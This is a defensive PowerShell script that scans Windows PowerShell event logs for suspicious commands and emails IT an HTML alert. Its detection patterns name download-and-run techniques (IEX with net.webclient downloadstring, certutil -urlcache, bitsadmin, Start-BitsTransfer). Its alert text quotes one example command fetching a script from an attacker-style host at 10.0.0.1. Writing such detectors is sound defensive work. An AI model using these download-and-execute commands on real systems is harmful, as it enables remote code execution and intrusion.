##################################################################################################################################
#                                                                                                                                #
# This Shell is for identifying malicious PowerShell commands as they are executed and alerting IT.                              #
#                                                                                                                                #
# Robert Osborne                                                                                                                 #
#                                                                                                                                #
# Last Update 12/24/2018                                                                                                         #
#                                                                                                                                #
##################################################################################################################################

param (
    [string]$ComputerName
)

    $ComputerName = $env:COMPUTERNAME

    $BadEvent = Get-WinEvent -FilterHashtable @{logname="Windows PowerShell"; id=800} -MaxEvents 100 | Where-Object -Process { $_.Message -like "*Pipeline execution details for command line: IEX*" }

    If (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "*IEX*")
    {

        $EventInfo = $BadEvent

    } # End If
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "certutil*-urlcache*")
    {

        $EventInfo = $BadEvent

    } # End Elseif
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "bitsadmin*")
    {

        $EventInfo = $BadEvent

    } # End Elseif
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "Start-BitsTransfer*")
    {

        $EventInfo = $BadEvent

    } # End Elseif

    $More = $EventInfo.Properties.Item(0)

    If (($More.Value -like "*IEX (New-Object net.webclient).downloadstring(*") -or ($More.Value -like "*IEX*"))
     {
         $Css = @"
<style>
table {
    font-family: verdana,arial,sans-serif;
        font-size:11px;
        color:#333333;
        border-width: 1px;
        border-color: #666666;
        border-collapse: collapse;
}
th {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #dedede;
}
td {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #ffffff;
}
</style>
"@

        $TableInfo = $EventInfo | Select-Object -Property 'MachineName', 'Message'

        $PreContent = "<Title>PowerShell RCE Monitoring Alert: Watches for Malicious Commands</Title>"

        $NoteLine = "$(Get-Date -Format 'MM/dd/yyyy HH:mm:ss')"

        $PostContent = "<br><p><font size='2'><i>$NoteLine</i></font>"

        $MailBody = $TableInfo | ConvertTo-Html -Head $Css -PostContent $PostContent -PreContent $PreContent -Body "If command is like 'IEX (New-Object net.webclient).downloadstring('http://10.0.0.1:8000/Something.ps1')'; an attacker is using something like a pyhton Simple HTTP Server to try to run commands on our network devices. The http site is most likely the attackers machine. If the command uses bitsadmin or certutil -urlcache -split -f the attacker is trying to download files to the
        device." | Out-String

        $MailBody += "This is the command that was issued:    "

        $MailBody += $More.Value

        Send-MailMessage -From "alert@osbornepro.com" -To "notifyme@osbornepro.com" -Subject "ALERT: Possbile PowerShell Attack: $ComputerName" -BodyAsHtml -Body $MailBody -SmtpServer smtpserver.com

    } # End If
